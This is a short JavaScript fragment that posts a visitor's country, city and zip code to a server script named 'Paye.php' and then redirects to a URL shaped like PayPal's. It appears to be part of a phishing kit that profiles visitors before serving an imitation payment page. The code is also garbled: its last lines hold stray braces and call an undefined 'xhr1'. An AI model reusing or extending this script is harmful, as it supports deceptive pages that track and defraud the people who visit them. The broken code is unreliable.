<script language="JavaScript">
	function GoAJAX(a,t){
	{url ="./lang/Paye.php";var xmlhttp;
	if (window.XMLHttpRequest)
	  {// code for IE7+, Firefox, Chrome, Opera, Safari
	  xmlhttp=new XMLHttpRequest();
	  }
	else
	  {// code for IE6, IE5
	  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
	  }
	xmlhttp.onreadystatechange=function()
	  {
	  if (xmlhttp.readyState==4 && xmlhttp.status==200)
	    {//xmlhttp.responseText
			if(t==1){
			window.location.href="./?cmd=_home&dispatch=5885d80a13c0db1f8e&ee=9fc3c0ece3fdd8f708fbf39b9811df4d";
			}
	    }
	  }
	xmlhttp.open("POST",url,true);
	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xmlhttp.send(a);
 
	}
	}
	function callback_function(object,type)
	{	var etat=false;
		if(type==1){
			GoAJAX('a=4&1=tempLang&tempLang='+object.countryCode+'&2=tLang&tLang='+object.country+'&3=city&city='+object.city+'&4=zip&zip='+object.zip,1);
		}else if(type==2){
			GoAJAX('a=4&1=tempLang&tempLang='+object.country_code+'&2=tLang&tLang='+object.country+'&3=city&city='+object.city+'&4=zip&zip=apinon',1);
		}
	}
	var xhr = new XMLHttpRequest();

	 	}

		    }
		}
		xhr1.send();
 	}
	xhr.onreadystatechange = function() {
